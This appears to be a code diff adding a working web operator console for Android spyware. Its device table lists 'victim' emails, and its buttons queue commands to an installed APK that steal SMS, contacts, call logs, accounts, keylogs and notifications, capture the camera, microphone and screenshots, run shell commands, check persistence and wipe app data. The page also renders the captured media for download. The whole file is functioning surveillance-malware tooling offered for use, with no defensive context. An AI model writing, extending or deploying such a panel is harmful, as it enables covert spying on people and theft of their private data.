@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>ANON · Operator Console</title>
+<style>
+:root{
+  --bg:#07060c;--card:#12101a;--line:#2a2238;--txt:#f0e9ff;--mut:#8f849f;
+  --acc:#9b4dff;--acc2:#6b2ad1;--ok:#5dff9a;--warn:#ffb020;--bad:#ff5d7a;
+  --font:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box}
+body{margin:0;font-family:var(--font);background:radial-gradient(900px 400px at 10% -10%,#2a145055,transparent),var(--bg);color:var(--txt);min-height:100vh}
+a{color:var(--acc)}
+button,input,select,textarea{font:inherit}
+button{cursor:pointer;border:0;border-radius:10px;padding:10px 14px;background:linear-gradient(90deg,var(--acc2),var(--acc));color:#fff;font-weight:600}
+button.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
+button:disabled{opacity:.5;cursor:not-allowed}
+input,textarea,select{width:100%;background:#0a0910;border:1px solid var(--line);border-radius:10px;color:var(--txt);padding:10px 12px}
+label{display:block;font-size:12px;color:var(--mut);margin:0 0 6px}
+.wrap{max-width:1200px;margin:0 auto;padding:20px}
+.top{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:18px}
+.brand{font-family:var(--mono);letter-spacing:.18em;font-weight:700}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px;margin-bottom:14px}
+.grid{display:grid;gap:14px}
+@media(min-width:900px){.grid.two{grid-template-columns:1.1fr .9fr}}
+.row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.muted{color:var(--mut);font-size:13px}
+.mono{font-family:var(--mono);font-size:12px}
+.tag{display:inline-block;padding:2px 8px;border-radius:999px;font-size:11px;border:1px solid var(--line)}
+.tag.ok{color:var(--ok);border-color:#2a6b45}
+.tag.off{color:var(--mut)}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th,td{text-align:left;padding:8px 6px;border-bottom:1px solid var(--line);vertical-align:top}
+th{color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.06em}
+tr:hover td{background:#ffffff06}
+tr.selected td{background:#9b4dff18}
+.cmds{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px}
+.cmds button{padding:10px;font-size:12px;background:#1a1228;border:1px solid var(--line)}
+.cmds button:hover{border-color:var(--acc)}
+pre{background:#0a0910;border:1px solid var(--line);border-radius:12px;padding:12px;overflow:auto;max-height:320px;font-size:12px;margin:0}
+#status{font-family:var(--mono);font-size:12px;color:var(--mut);min-height:18px}
+#gate{max-width:420px;margin:10vh auto}
+.err{color:var(--bad);font-size:13px;margin-top:8px}
+img.capture{max-width:100%;border-radius:10px;display:block}
+audio{width:100%}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div id="gate" class="card">
+    <div class="brand" style="margin-bottom:8px">ANON · OPS</div>
+    <p class="muted">Operator console. Enter OPERATOR_TOKEN.</p>
+    <label>Token</label>
+    <input id="tokenInput" type="password" placeholder="OPERATOR_TOKEN" autocomplete="off"/>
+    <div class="row" style="margin-top:12px">
+      <button id="unlockBtn">Unlock</button>
+    </div>
+    <div class="err" id="gateErr"></div>
+  </div>
+
+  <div id="app" hidden>
+    <div class="top">
+      <div>
+        <div class="brand">ANON · OPERATOR</div>
+        <div class="muted" id="status">ready</div>
+      </div>
+      <div class="row">
+        <button class="ghost" id="refreshBtn">Refresh</button>
+        <button class="ghost" id="logoutBtn">Lock</button>
+      </div>
+    </div>
+
+    <div class="grid two">
+      <div>
+        <div class="card">
+          <div class="row" style="justify-content:space-between;margin-bottom:10px">
+            <strong>Devices</strong>
+            <div class="row">
+              <button class="ghost" id="btnOnline">Online</button>
+              <button class="ghost" id="btnUsers">All</button>
+            </div>
+          </div>
+          <div style="overflow:auto">
+            <table>
+              <thead>
+                <tr><th>Status</th><th>Email</th><th>Device</th><th>Last seen</th></tr>
+              </thead>
+              <tbody id="deviceBody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="card">
+          <strong>Target</strong>
+          <p class="muted">Send by device id <em>or</em> victim email (whichever is set).</p>
+          <div class="grid" style="margin-top:10px">
+            <div>
+              <label>Device ID</label>
+              <input id="deviceId" placeholder="uuid from table" autocomplete="off"/>
+            </div>
+            <div>
+              <label>Email</label>
+              <input id="email" type="email" placeholder="victim@example.com" autocomplete="off"/>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <strong>Commands</strong>
+          <div class="cmds" id="cmdGrid" style="margin-top:10px"></div>
+          <div class="grid" style="margin-top:12px">
+            <div>
+              <label>Custom name</label>
+              <input id="customName" placeholder="info"/>
+            </div>
+            <div>
+              <label>Args JSON</label>
+              <textarea id="args" rows="3">{}</textarea>
+            </div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <button id="enqueueCustom">Enqueue</button>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <strong>Result</strong>
+          <div id="mediaOut" style="margin:10px 0"></div>
+          <pre id="out">Ready.</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+const ONLINE_MS = 45000;
+const COMMANDS = [
+  {name:'info', label:'info'},
+  {name:'geoloc', label:'geoloc'},
+  {name:'sms', label:'sms'},
+  {name:'contacts', label:'contacts'},
+  {name:'clipboard', label:'clipboard'},
+  {name:'files', label:'files', args:{path:'/sdcard'}},
+  {name:'shell', label:'shell', args:{cmd:'id'}},
+  {name:'cam', label:'cam'},
+  {name:'mic', label:'mic', args:{seconds:8}},
+  {name:'screenshot', label:'screenshot'},
+  {name:'calllog', label:'calllog'},
+  {name:'accounts', label:'accounts'},
+  {name:'apps', label:'apps'},
+  {name:'wifi', label:'wifi'},
+  {name:'sim', label:'sim'},
+  {name:'notifications', label:'notifications'},
+  {name:'keylog_dump', label:'keylog'},
+  {name:'persist_status', label:'persist'},
+  {name:'push_text', label:'push', args:{text:'test'}},
+  {name:'wipe_app_data', label:'wipe'},
+];
+
+let token = sessionStorage.getItem('op_token') || '';
+const $ = (id) => document.getElementById(id);
+
+function setStatus(s){ $('status').textContent = s; }
+
+function setOut(x){
+  const pre = $('out');
+  const media = $('mediaOut');
+  media.innerHTML = '';
+  pre.textContent = typeof x === 'string' ? x : JSON.stringify(x, null, 2);
+  try { renderMedia(typeof x === 'string' ? null : x, media); } catch(e){ console.warn(e); }
+}
+
+function pickB64(node){
+  if (!node || typeof node !== 'object') return null;
+  const candidates = [];
+  if (node.data) candidates.push(node.data);
+  candidates.push(node);
+  if (node.data && node.data.data) candidates.push(node.data.data);
+  for (const c of candidates){
+    if (!c || typeof c !== 'object') continue;
+    const b64 = c.b64 || c.base64 || c.image || c.audio;
+    if (typeof b64 === 'string' && b64.length > 32){
+      return { b64, mime: c.mime || c.contentType || guessMime(c, b64) };
+    }
+  }
+  return null;
+}
+function guessMime(c, b64){
+  if (c && c.seconds != null) return 'audio/mp4';
+  if (c && (c.w || c.h)) return 'image/jpeg';
+  if (b64.startsWith('/9j/')) return 'image/jpeg';
+  if (b64.startsWith('iVBOR')) return 'image/png';
+  return 'application/octet-stream';
+}
+function renderMedia(obj, mount){
+  const hit = pickB64(obj);
+  if (!hit) return;
+  const { b64, mime } = hit;
+  const url = 'data:' + mime + ';base64,' + b64;
+  const card = document.createElement('div');
+  card.style.cssText = 'border:1px solid var(--line);border-radius:12px;padding:12px;background:#0a0910;margin-bottom:8px';
+  const title = document.createElement('div');
+  title.className = 'mono muted';
+  title.style.marginBottom = '8px';
+  title.textContent = mime + ' · ' + Math.round(b64.length * 0.75 / 1024) + ' KB';
+  card.appendChild(title);
+  if (mime.startsWith('image/')){
+    const img = document.createElement('img');
+    img.className = 'capture';
+    img.src = url;
+    card.appendChild(img);
+  } else if (mime.startsWith('audio/')){
+    const audio = document.createElement('audio');
+    audio.controls = true;
+    audio.src = url;
+    card.appendChild(audio);
+  }
+  const dl = document.createElement('a');
+  dl.href = url;
+  dl.download = mime.startsWith('audio/') ? 'mic.m4a' : 'capture.jpg';
+  dl.textContent = 'Download';
+  dl.style.display = 'inline-block';
+  dl.style.marginTop = '8px';
+  card.appendChild(document.createElement('br'));
+  card.appendChild(dl);
+  mount.appendChild(card);
+}
+
+async function api(path, opts={}){
+  const headers = Object.assign({'Content-Type':'application/json','Authorization':'Bearer '+token}, opts.headers||{});
+  const res = await fetch(path, Object.assign({}, opts, { headers }));
+  const text = await res.text();
+  let data; try { data = JSON.parse(text); } catch { data = { raw: text }; }
+  if (!res.ok) throw new Error((data && data.error) || res.status + ' ' + text);
+  return data;
+}
+
+function ago(ts){
+  if (!ts) return '—';
+  const s = Math.max(0, Math.round((Date.now()-ts)/1000));
+  if (s < 60) return s + 's';
+  if (s < 3600) return Math.round(s/60) + 'm';
+  return Math.round(s/3600) + 'h';
+}
+
+function renderDevices(list){
+  const body = $('deviceBody');
+  body.innerHTML = '';
+  for (const d of list){
+    const tr = document.createElement('tr');
+    const model = (d.meta && (d.meta.model || d.meta.manufacturer)) || '';
+    tr.innerHTML = `<td>${d.online?'<span class="tag ok">online</span>':'<span class="tag off">offline</span>'}</td>
+      <td class="mono">${d.email||'—'}</td>
+      <td class="mono" title="${d.id}">${(d.id||'').slice(0,8)}… ${model}</td>
+      <td class="muted">${ago(d.lastSeen)}</td>`;
+    tr.onclick = () => {
+      $('deviceId').value = d.id || '';
+      $('email').value = d.email || '';
+      body.querySelectorAll('tr').forEach(x => x.classList.remove('selected'));
+      tr.classList.add('selected');
+    };
+    body.appendChild(tr);
+  }
+}
+
+async function loadUsers(){
+  setStatus('loading devices…');
+  const list = await api('/op/devices');
+  const arr = Array.isArray(list) ? list : (list.devices || []);
+  renderDevices(arr);
+  setOut(arr);
+  setStatus('devices: ' + arr.length);
+}
+async function loadOnline(){
+  setStatus('loading online…');
+  const res = await api('/online');
+  renderDevices(res.devices || []);
+  setOut(res);
+  setStatus('online: ' + (res.count||0));
+}
+
+async function enqueue(name, args){
+  const deviceId = $('deviceId').value.trim();
+  const email = $('email').value.trim();
+  if (!deviceId && !email){ setStatus('set device id or email'); return; }
+  let parsed = args;
+  if (!parsed){
+    try { parsed = JSON.parse($('args').value || '{}'); }
+    catch { setStatus('args JSON invalid'); return; }
+  }
+  setStatus('enqueue ' + name + '…');
+  const body = { name, args: parsed || {} };
+  if (deviceId) body.deviceId = deviceId;
+  if (email) body.email = email;
+  const res = await api('/op/enqueue', { method:'POST', body: JSON.stringify(body) });
+  setOut(res);
+  setStatus('queued ' + name + ' → ' + res.jobId + ' @ ' + (res.deviceId||'').slice(0,8));
+  for (let i=0;i<10;i++){
+    await new Promise(r => setTimeout(r, 2000));
+    try {
+      const result = await api('/op/result/' + res.jobId);
+      setOut(result);
+      setStatus('result for ' + name + (result.ok===false?' (failed)':' (ok)'));
+      return;
+    } catch(_){}
+  }
+  setStatus('queued; waiting for device poll — keep APK open');
+}
+
+function buildCmds(){
+  const g = $('cmdGrid');
+  g.innerHTML = '';
+  for (const c of COMMANDS){
+    const b = document.createElement('button');
+    b.textContent = c.label;
+    b.onclick = () => {
+      if (c.args) $('args').value = JSON.stringify(c.args, null, 2);
+      enqueue(c.name, c.args);
+    };
+    g.appendChild(b);
+  }
+}
+
+function unlock(){
+  token = $('tokenInput').value.trim();
+  if (!token){ $('gateErr').textContent = 'token required'; return; }
+  sessionStorage.setItem('op_token', token);
+  $('gate').hidden = true;
+  $('app').hidden = false;
+  buildCmds();
+  loadOnline().catch(e => setStatus(String(e)));
+}
+
+$('unlockBtn').onclick = unlock;
+$('tokenInput').addEventListener('keydown', e => { if (e.key === 'Enter') unlock(); });
+$('logoutBtn').onclick = () => { sessionStorage.removeItem('op_token'); location.reload(); };
+$('refreshBtn').onclick = () => loadUsers().catch(e => setStatus(String(e)));
+$('btnOnline').onclick = () => loadOnline().catch(e => setStatus(String(e)));
+$('btnUsers').onclick = () => loadUsers().catch(e => setStatus(String(e)));
+$('enqueueCustom').onclick = () => enqueue($('customName').value.trim());
+
+if (token){
+  $('gate').hidden = true;
+  $('app').hidden = false;
+  buildCmds();
+  loadOnline().catch(e => setStatus(String(e)));
+}
+</script>
+</body>
+</html>
